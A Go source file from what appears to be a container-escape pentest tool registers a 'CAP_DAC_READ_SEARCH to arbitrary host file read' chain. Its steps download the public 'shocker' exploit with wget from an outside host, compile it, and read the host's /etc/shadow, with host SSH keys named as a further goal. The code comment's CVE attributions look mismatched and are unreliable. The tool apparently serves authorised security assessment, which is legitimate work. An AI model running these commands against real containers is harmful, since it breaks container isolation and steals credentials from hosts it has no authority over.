package chains

import (
	"github.com/tristanvaquero/escape/pkg/check"
	"github.com/tristanvaquero/escape/pkg/exploit"
)

// dacReadSearch — CAP_DAC_READ_SEARCH bypasses DAC for *read*. Combined
// with the open_by_handle_at "shocker"-style technique, it can read any
// file on the host (CVE-2014-9357 family + the related modprobe write
// path that became CVE-2022-0492).
type dacReadSearch struct{ exploit.Base }

func (c *dacReadSearch) Matches(results []check.Result) *exploit.Match {
	if !exploit.EvidenceContains(results, "container.capabilities.dangerous", "CAP_DAC_READ_SEARCH") {
		return nil
	}
	return &exploit.Match{
		ChainID:    c.ID(),
		Required:   []string{"container.capabilities.dangerous"},
		Confidence: "medium",
	}
}

func (c *dacReadSearch) Steps(_ *exploit.Match) []exploit.Step {
	return []exploit.Step{
		{
			Title:   "Confirm capability",
			Command: `grep CapEff /proc/self/status`,
			Note:    "Bit 1 corresponds to CAP_DAC_READ_SEARCH.",
		},
		{
			Title: "Use the public 'shocker'-style PoC",
			Command: `# original PoC: https://stealth.openwall.net/xSports/shocker.c
wget -qO /tmp/shocker.c https://stealth.openwall.net/xSports/shocker.c
gcc /tmp/shocker.c -o /tmp/shocker
/tmp/shocker /etc/shadow`,
			Note: "The PoC walks file handles backwards from the container root and reads arbitrary host paths. Do this against a target you own.",
		},
		{
			Title: "Alternative: direct open_by_handle_at probe",
			Command: `python3 - <<'PY'
import ctypes, os
# Skeleton — full PoC in shocker.c above.
print("see shocker.c for the full implementation")
PY`,
			Note: "shocker.c is the canonical reference; the Python skeleton just shows the syscall API.",
		},
	}
}

func init() {
	exploit.Register(&dacReadSearch{Base: exploit.Base{
		IDValue:       "chain.dac_read_search",
		NameValue:     "CAP_DAC_READ_SEARCH → arbitrary host file read",
		GoalValue:     "Read any file on the host filesystem (e.g. /etc/shadow, host SSH keys).",
		RiskValue:     exploit.RiskActiveRead,
		SeverityValue: check.SeverityHigh,
		ReferencesValue: []string{
			"https://stealth.openwall.net/xSports/shocker.c",
		},
		AttackValue: []string{"T1611", "T1552"},
	}})
}
